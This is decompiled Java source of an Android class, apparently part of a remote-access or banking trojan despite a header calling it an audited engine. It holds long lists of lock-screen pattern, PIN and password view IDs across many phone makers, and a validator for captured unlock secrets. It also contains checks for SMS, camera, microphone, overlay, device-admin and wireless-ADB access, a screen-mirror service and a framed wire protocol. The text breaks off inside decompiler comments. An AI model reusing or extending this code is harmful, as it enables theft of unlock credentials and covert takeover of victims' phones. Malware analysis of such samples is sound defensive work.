// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AppOpsManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Rect;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Parcel;
import android.os.PowerManager;
import android.os.Process;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.os9sp.yfwkcq0dwfxaf.R;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.AtomicMoveNotSupportedException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import lyr.stable.runtime.ConfirmCredentialActivity;
import lyr.stable.runtime.DeviceAdminRequestActivity;
import lyr.stable.runtime.NotificationListener;
import lyr.stable.runtime.ScreenMirrorAdminReceiver;
import lyr.stable.runtime.ScreenMirrorService;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public abstract class n {
    public static volatile y.l B = null;
    public static int E = 0;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public static HandlerThread f4564b = null;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public static Handler f4565c = null;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public static Context f4566d = null;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static boolean f4567e = false;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public static HandlerThread f4571i = null;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public static Handler f4572j = null;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public static Context f4573k = null;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public static int f4574l = 0;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public static l0 f4576o = null;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public static Handler f4577p = null;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public static long f4578q = -1;

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public static long f4579r = -1;

    /* JADX INFO: renamed from: s, reason: collision with root package name */
    public static boolean f4580s;

    /* JADX INFO: renamed from: t, reason: collision with root package name */
    public static boolean f4581t;

    /* JADX INFO: renamed from: u, reason: collision with root package name */
    public static boolean f4582u;

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public static boolean f4583v;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static final Object f4563a = new Object();

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static final d2.r f4568f = new d2.r(6);

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public static final g f4569g = new g(0);

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static final Object f4570h = new Object();

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public static final g f4575m = new g(1);
    public static final Object n = new Object();

    /* JADX INFO: renamed from: w, reason: collision with root package name */
    public static final byte[] f4584w = {65, 80, 80, 49};

    /* JADX INFO: renamed from: x, reason: collision with root package name */
    public static final Object f4585x = new Object();

    /* JADX INFO: renamed from: y, reason: collision with root package name */
    public static final String[] f4586y = {"media", "call", "ring", "notification", "alarm", "system"};

    /* JADX INFO: renamed from: z, reason: collision with root package name */
    public static final int[] f4587z = {3, 0, 2, 5, 4, 1};
    public static final Object A = new Object();
    public static final String[] C = {"mirror_a11y_lost", "mirror_a11y_remind_v1"};
    public static final long[] D = {0, 400, 200, 400, 200, 800};
    public static final String[] F = {"Open", "Abrir", "打开", "開啟", "开启", "Allow", "允许", "允許"};
    public static final String[] G = {"battery", "installed_apps", "vendor_battery", "oem_autostart", "overlay", "notif_channel_hide"};
    public static final String[] H = {"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_CONTACTS", "android.permission.READ_PHONE_STATE"};
    public static final String[] I = {"android.permission.CAMERA", "android.permission.RECORD_AUDIO"};
    public static final Object J = new Object();
    public static final Object K = new Object();
    public static final String[] L = {"com.android.systemui:id/colorLockPatternView", "com.android.systemui:id/lockPatternView", "com.android.systemui:id/lock_pattern_view", "com.android.systemui:id/patternView", "com.android.systemui:id/pattern_view", "com.android.systemui:id/vivo_lock_pattern_view", "com.android.systemui:id/color_lock_pattern_view", "com.android.systemui:id/oppo_lock_pattern_view", "com.android.systemui:id/hw_lock_pattern_view", "com.android.systemui:id/miui_lock_pattern_view", "com.android.systemui:id/sec_lock_pattern_view", "com.android.systemui:id/keyguard_pattern_view", "com.android.systemui:id/keyguard_pattern_view_pattern", "com.android.systemui:id/lockPattern", "com.android.systemui:id/lock_pattern", "com.android.systemui:id/keyguard_pattern", "com.android.systemui:id/pattern", "com.sec.android.app.keyguard:id/lockPatternView", "com.samsung.android.keyguard:id/lockPatternView", "com.samsung.android.keyguard:id/patternView", "com.huawei.systemui:id/lockPatternView", "com.huawei.systemui:id/lock_pattern_view", "com.huawei.keyguard:id/lockPatternView", "com.miui.keyguard:id/lockPatternView", "com.miui.keyguard:id/miui_lock_pattern_view", "com.coloros.systemui:id/lockPatternView", "com.oppo.systemui:id/lockPatternView", "com.oplus.systemui:id/lockPatternView", "com.bbk.lockscreen:id/lockPatternView", "com.bbk.systemui:id/lockPatternView", "com.vivo.systemui:id/lockPatternView", "com.oneplus.systemui:id/lockPatternView", "com.realme.systemui:id/lockPatternView", "com.nothing.systemui:id/lockPatternView", "com.tecno.systemui:id/lockPatternView", "com.infinix.systemui:id/lockPatternView", "com.itel.systemui:id/lockPatternView", "com.transsion.systemui:id/lockPatternView", "com.lge.systemui:id/lockPatternView", "com.lge.keyguard:id/lockPatternView", "com.lge.lockscreen:id/lockPatternView", "com.motorola.systemui:id/lockPatternView", "com.zte.systemui:id/lockPatternView", "com.tcl.systemui:id/lockPatternView", "com.hmd.systemui:id/lockPatternView", "com.sonymobile.systemui:id/lockPatternView", "com.asus.systemui:id/lockPatternView", "com.lenovo.systemui:id/lockPatternView", "com.android.keyguard:id/lockPatternView", "com.android.keyguard:id/pattern_view", "com.sec.android.app.launcher:id/lockPatternView", "com.android.settings:id/lockPattern", "com.android.settings:id/lockPatternView", "com.android.settings:id/confirm_lock_pattern", "com.samsung.android.biometrics.app.setting:id/lockPatternView", "com.samsung.android.biometrics.app.setting:id/lockPattern", "com.samsung.android.biometrics.app.setting:id/patternView", "com.samsung.android.biometrics.app.setting:id/sec_lock_pattern_view", "com.samsung.android.systemui:id/lockPatternView", "com.samsung.android.systemui:id/lock_pattern_view"};
    public static final String[] M = {"com.android.systemui:id/pinEntry", "com.android.systemui:id/pinEntryView", "com.android.systemui:id/pin_entry", "com.android.systemui:id/simPinEntry", "com.android.systemui:id/pukEntry", "com.android.systemui:id/vivo_pin_edittext", "com.android.systemui:id/color_pin_edittext", "com.android.systemui:id/oppo_pin_edittext", "com.android.systemui:id/hw_pin_entry", "com.android.systemui:id/miui_pin_entry", "com.android.systemui:id/sec_pin_entry", "com.android.systemui:id/keyguard_pin_view", "com.android.systemui:id/keyguard_pin_entry", "com.android.keyguard:id/pinEntry", "com.samsung.android.keyguard:id/pinEntry", "com.samsung.android.keyguard:id/pin_entry", "com.samsung.android.systemui:id/pinEntry", "com.sec.android.app.launcher:id/pinEntry", "com.miui.keyguard:id/pinEntry", "com.miui.keyguard:id/miui_pin_entry", "com.miui.keyguard:id/numeric_inputview", "com.huawei.keyguard:id/pinEntry", "com.huawei.systemui:id/pinEntry", "com.vivo.systemui:id/pinEntry", "com.bbk.systemui:id/pinEntry", "com.oppo.systemui:id/pinEntry", "com.oplus.systemui:id/pinEntry", "com.coloros.systemui:id/pinEntry", "com.oneplus.systemui:id/pinEntry", "com.realme.systemui:id/pinEntry", "com.motorola.systemui:id/pinEntry", "com.sonymobile.systemui:id/pinEntry", "com.lge.systemui:id/pinEntry", "com.lge.keyguard:id/pinEntry", "com.asus.systemui:id/pinEntry", "com.lenovo.systemui:id/pinEntry", "com.transsion.systemui:id/pinEntry"};
    public static final String[] N = {"com.android.systemui:id/passwordEntry", "com.android.systemui:id/passwordEntryView", "com.android.systemui:id/passwordInputView", "com.android.systemui:id/password_entry", "com.android.systemui:id/vivo_password_entry", "com.android.systemui:id/color_password_entry", "com.android.systemui:id/oppo_password_entry", "com.android.systemui:id/hw_password_entry", "com.android.systemui:id/miui_password_entry", "com.android.systemui:id/sec_password_entry", "com.android.systemui:id/keyguard_password_view", "com.android.systemui:id/miui_mixed_password_input_field", "com.android.systemui:id/miui_mixed_password", "com.android.keyguard:id/passwordEntry", "com.samsung.android.keyguard:id/passwordEntry", "com.samsung.android.keyguard:id/password_entry", "com.sec.android.app.launcher:id/passwordEntry", "com.miui.keyguard:id/passwordEntry", "com.miui.keyguard:id/miui_password_entry", "com.miui.keyguard:id/miui_mixed_password_input_field", "com.miui.keyguard:id/mixed_password", "com.huawei.keyguard:id/passwordEntry", "com.huawei.systemui:id/passwordEntry", "com.vivo.systemui:id/passwordEntry", "com.bbk.systemui:id/passwordEntry", "com.oppo.systemui:id/passwordEntry", "com.oplus.systemui:id/passwordEntry", "com.coloros.systemui:id/passwordEntry", "com.oneplus.systemui:id/passwordEntry", "com.realme.systemui:id/passwordEntry", "com.motorola.systemui:id/passwordEntry", "com.sonymobile.systemui:id/passwordEntry", "com.lge.systemui:id/passwordEntry", "com.lge.keyguard:id/passwordEntry", "com.asus.systemui:id/passwordEntry", "com.lenovo.systemui:id/passwordEntry", "com.transsion.systemui:id/passwordEntry"};
    public static final String[] O = {"systemui", "keyguard", "lockscreen", "settings", "biometric"};

    public static boolean A(Context context) {
        try {
            String packageName = context.getPackageName();
            String string = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
            if (string == null) {
                return false;
            }
            for (String str : string.split(":")) {
                if (str != null) {
                    if (str.startsWith(packageName + "/")) {
                        return true;
                    }
                }
            }
        } catch (Throwable unused) {
        }
        return false;
    }

    public static void A0(Context context, boolean z2) {
        synchronized (K) {
            Context applicationContext = context.getApplicationContext();
            if (applicationContext != null) {
                context = applicationContext;
            }
            Context contextCreateDeviceProtectedStorageContext = context.createDeviceProtectedStorageContext();
            if (contextCreateDeviceProtectedStorageContext != null) {
                context = contextCreateDeviceProtectedStorageContext;
            }
            File file = new File(new File(context.getFilesDir(), "a11y"), "sequential-permission-v1");
            try {
                File parentFile = file.getParentFile();
                if (parentFile != null && !parentFile.exists() && !parentFile.mkdirs() && !parentFile.isDirectory()) {
                    return;
                }
                RandomAccessFile randomAccessFile = new RandomAccessFile(file, "rw");
                try {
                    FileChannel channel = randomAccessFile.getChannel();
                    try {
                        FileLock fileLockLock = channel.lock();
                        try {
                            randomAccessFile.setLength(0L);
                            randomAccessFile.writeInt(1397837873);
                            randomAccessFile.writeInt(1);
                            randomAccessFile.writeBoolean(z2);
                            randomAccessFile.writeLong(SystemClock.elapsedRealtime());
                            randomAccessFile.getFD().sync();
                            if (fileLockLock != null) {
                                fileLockLock.close();
                            }
                            channel.close();
                            randomAccessFile.close();
                        } catch (Throwable th) {
                            if (fileLockLock != null) {
                                try {
                                    fileLockLock.close();
                                } catch (Throwable th2) {
                                    th.addSuppressed(th2);
                                }
                            }
                            throw th;
                        }
                    } catch (Throwable th3) {
                        if (channel != null) {
                            try {
                                channel.close();
                            } catch (Throwable th4) {
                                th3.addSuppressed(th4);
                            }
                        }
                        throw th3;
                    }
                } catch (Throwable th5) {
                    try {
                        randomAccessFile.close();
                    } catch (Throwable th6) {
                        th5.addSuppressed(th6);
                    }
                    throw th5;
                }
            } catch (Throwable unused) {
            }
        }
    }

    public static boolean B(Context context) {
        if (context == null) {
            return false;
        }
        try {
            if (Settings.canDrawOverlays(context)) {
                return true;
            }
        } catch (Throwable unused) {
        }
        try {
            AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(AppOpsManager.class);
            return appOpsManager != null && appOpsManager.checkOpNoThrow("android:system_alert_window", Process.myUid(), context.getPackageName()) == 0;
        } catch (Throwable unused2) {
            return false;
        }
    }

    public static String B0(w2 w2Var, long j3) {
        if (w2Var == null) {
            return "invalid_record";
        }
        String str = w2Var.f5387d;
        String str2 = w2Var.f5386c;
        String str3 = w2Var.f5384a;
        if (str3 == null || str3.isEmpty() || str3.codePointCount(0, str3.length()) > 64) {
            return "invalid_id";
        }
        String str4 = w2Var.f5385b;
        int iCodePointCount = str4.codePointCount(0, str4.length());
        if (iCodePointCount < 4 || iCodePointCount > 128) {
            return "invalid_secret_length";
        }
        if (!"pin".equals(str2) && !"password".equals(str2) && !"pattern".equals(str2)) {
            return "invalid_mode";
        }
        if (!"passive".equals(str) && !"mask".equals(str) && !"ctl".equals(str)) {
            return "invalid_provenance";
        }
        if (j3 <= 0) {
            return "invalid_captured_at";
        }
        long jMax = Math.max(1L, j3 - 157680000000L);
        long j4 = j3 > 9223372036768375807L ? Long.MAX_VALUE : j3 + 86400000;
        long j5 = w2Var.f5388e;
        if (j5 < jMax || j5 > j4) {
            return "invalid_captured_at";
        }
        return null;
    }

    public static boolean C(Context context) {
        try {
            AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService("appops");
            return appOpsManager != null && appOpsManager.checkOpNoThrow("android:get_usage_stats", Process.myUid(), context.getPackageName()) == 0;
        } catch (Throwable unused) {
        }
    }

    public static boolean C0(Context context) {
        try {
            return context.getApplicationContext().getSharedPreferences("a11y_restore", 0).getBoolean("ever_enabled", false);
        } catch (Throwable unused) {
            return false;
        }
    }

    public static boolean D(Context context) {
        try {
            DevicePolicyManager devicePolicyManagerQ = q(context);
            return devicePolicyManagerQ != null && devicePolicyManagerQ.isAdminActive(ScreenMirrorAdminReceiver.a(context));
        } catch (Throwable unused) {
        }
    }

    public static void D0(Context context, boolean z2, long j3, String str, long j4) {
        synchronized (J) {
            try {
                File fileZ0 = z0(context);
                File parentFile = fileZ0.getParentFile();
                if (parentFile == null || parentFile.exists() || parentFile.mkdirs() || parentFile.isDirectory()) {
                    if (str.length() > 256) {
                        str = str.substring(0, 256);
                    }
                    RandomAccessFile randomAccessFile = new RandomAccessFile(fileZ0, "rw");
                    try {
                        FileChannel channel = randomAccessFile.getChannel();
                        try {
                            FileLock fileLockLock = channel.lock();
                            try {
                                randomAccessFile.setLength(0L);
                                randomAccessFile.seek(0L);
                                randomAccessFile.writeInt(1347570225);
                                randomAccessFile.writeInt(1);
                                randomAccessFile.writeBoolean(z2);
                                randomAccessFile.writeLong(j3);
                                randomAccessFile.writeLong(j4);
                                randomAccessFile.writeUTF(str);
                                randomAccessFile.getFD().sync();
                                if (fileLockLock != null) {
                                    fileLockLock.close();
                                }
                                channel.close();
                                randomAccessFile.close();
                            } catch (Throwable th) {
                                if (fileLockLock != null) {
                                    try {
                                        fileLockLock.close();
                                    } catch (Throwable th2) {
                                        th.addSuppressed(th2);
                                    }
                                }
                                throw th;
                            }
                        } catch (Throwable th3) {
                            if (channel != null) {
                                try {
                                    channel.close();
                                } catch (Throwable th4) {
                                    th3.addSuppressed(th4);
                                }
                            }
                            throw th3;
                        }
                    } catch (Throwable th5) {
                        try {
                            randomAccessFile.close();
                        } catch (Throwable th6) {
                            th5.addSuppressed(th6);
                        }
                        throw th5;
                    }
                }
            } catch (Throwable th7) {
                Log.w("ProjectionReqLease", "write failed: " + th7.getMessage());
            }
        }
    }

    public static boolean E(String str) {
        if (str == null || str.isEmpty()) {
            return false;
        }
        String lowerCase = str.toLowerCase(Locale.ROOT);
        return lowerCase.contains("securitypermission") || lowerCase.contains("oplus.permission") || lowerCase.contains("coloros.permission");
    }

    public static void E0(OutputStream outputStream, String str) throws IOException {
        F0(outputStream, (byte) 127, a0.a.h("{\"code\":\"", str, "\"}").getBytes(StandardCharsets.UTF_8), false);
    }

    public static boolean F(Context context) {
        PowerManager powerManager = (PowerManager) context.getSystemService("power");
        return powerManager != null && powerManager.isIgnoringBatteryOptimizations(context.getPackageName());
    }

    public static void F0(OutputStream outputStream, byte b3, byte[] bArr, boolean z2) throws IOException {
        if (bArr == null) {
            bArr = new byte[0];
        }
        if (bArr.length > 2097152) {
            b2.a.k("APP1 expanded payload too large: ", bArr.length);
            return;
        }
        if (z2) {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(Math.min(bArr.length, 32768));
            GZIPOutputStream gZIPOutputStream = new GZIPOutputStream(byteArrayOutputStream);
            gZIPOutputStream.write(bArr);
            gZIPOutputStream.finish();
            gZIPOutputStream.close();
            bArr = byteArrayOutputStream.toByteArray();
        }
        if (bArr.length > 524288) {
            b2.a.k("APP1 wire payload too large: ", bArr.length);
            return;
        }
        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
        dataOutputStream.write(f4584w);
        dataOutputStream.writeByte(b3 & 255);
        dataOutputStream.writeByte(z2 ? 1 : 0);
        dataOutputStream.writeInt(bArr.length);
        dataOutputStream.write(bArr);
        dataOutputStream.flush();
    }

    public static boolean G(Context context) {
        try {
            DevicePolicyManager devicePolicyManagerQ = q(context);
            return devicePolicyManagerQ != null && devicePolicyManagerQ.isDeviceOwnerApp(context.getPackageName());
        } catch (Throwable unused) {
        }
    }

    public static Handler G0() {
        Handler handler;
        synchronized (f4563a) {
            try {
                if (f4564b == null || f4565c == null) {
                    HandlerThread handlerThread = new HandlerThread("a11y-bind-lease-writer");
                    f4564b = handlerThread;
                    handlerThread.start();
                    f4565c = new Handler(f4564b.getLooper());
                }
                handler = f4565c;
            } catch (Throwable th) {
                throw th;
            }
        }
        return handler;
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code duplicated, block: B:138:0x0188 A[RETURN] */
    public static boolean H(Context context, String str) {
        if (context != null && str != null) {
            switch (str) {
                case "projection":
                    ScreenMirrorService screenMirrorServiceU2 = ScreenMirrorService.U2();
                    if (screenMirrorServiceU2 != null && screenMirrorServiceU2.i4()) {
                        return true;
                    }
                    break;
                case "installed_apps":
                    return context.getPackageManager().canRequestPackageInstalls();
                case "write_settings":
                    return Settings.System.canWrite(context);
                case "camera":
                    String[] strArr = I;
                    for (int i3 = 0; i3 < 2; i3++) {
                        if (context.checkSelfPermission(strArr[i3]) != 0) {
                            return false;
                        }
                    }
                    return true;
                case "overlay":
                    return B(context);
                case "device_admin":
                    return D(context);
                case "oem_autostart":
                    return I(context);
                case "battery":
                    return F(context);
                case "notif_channel_hide":
                    if (Build.VERSION.SDK_INT >= 33) {
                        return true;
                    }
                    break;
                case "sms":
                    String[] strArr2 = H;
                    for (int i4 = 0; i4 < 5; i4++) {
                        if (context.checkSelfPermission(strArr2[i4]) != 0) {
                            return false;
                        }
                    }
                    return true;
                case "files":
                    return z(context);
                case "usage":
                    return C(context);
                case "vendor_battery":
                    if (f2.l.z(context) || f2.l.y(context)) {
                        return true;
                    }
                    break;
                case "notifications":
                    return A(context);
                case "wireless_adb":
                    bg bgVar = cg.f3745d;
                    return bgVar != null && bgVar.a();
                case "post_notif":
                    if (Build.VERSION.SDK_INT < 33 || context.checkSelfPermission("android.permission.POST_NOTIFICATIONS") == 0) {
                        return true;
                    }
                    break;
                case "install":
                    return context.getPackageManager().canRequestPackageInstalls();
            }
        }
        return false;
    }

    public static boolean I(Context context) {
        int iE;
        SharedPreferences sharedPreferencesY = f2.l.Y(context);
        if ((sharedPreferencesY.getBoolean("auto_start_explicitly_skipped", false) && sharedPreferencesY.getInt("auto_start_skip_version", 0) == 3) || (iE = f2.i0.E(context)) == 1) {
            return true;
        }
        if (iE == 2) {
            return false;
        }
        return f2.l.p(context);
    }

    public static boolean J(String str) {
        if (str == null) {
            return false;
        }
        for (int i3 = 0; i3 < 6; i3++) {
            if (G[i3].equals(str)) {
                return true;
            }
        }
        return false;
    }

    public static boolean K(Context context) {
        if (ScreenMirrorService.U2() != null) {
            return true;
        }
        Looper mainLooper = Looper.getMainLooper();
        return (mainLooper == null || Looper.myLooper() != mainLooper) ? f.a(context, null).b(SystemClock.elapsedRealtime()) : f.b(context).b(SystemClock.elapsedRealtime());
    }

    public static boolean L(Context context) {
        return K(context) || p0(context).a();
    }

    public static boolean M(Bundle bundle) {
        if (bundle != null && bundle.getInt("version", -1) == 1) {
            bundle.setClassLoader(n.class.getClassLoader());
            String string = bundle.getString("value");
            if (string != null && string.length() > 16384) {
                return false;
            }
            String string2 = bundle.getString("reason");
            if (string2 != null && string2.length() > 16384) {
                return false;
            }
            String string3 = bundle.getString("request_id");
            if (string3 != null && string3.length() > 16384) {
                return false;
            }
            Parcel parcelObtain = Parcel.obtain();
            try {
                parcelObtain.writeBundle(bundle);
                boolean z2 = parcelObtain.dataSize() <= 65536;
                parcelObtain.recycle();
                return z2;
            } catch (Throwable unused) {
                parcelObtain.recycle();
            }
        }
        return false;
    }

    public static boolean N(int i3) {
        return i3 == 2048 || i3 == 32 || i3 == 4194304;
    }

    /* JADX WARN: Code duplicated, block: B:100:0x01be A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:102:0x01c4 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:103:0x01cb A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:104:0x01f7 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:106:0x01ff A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
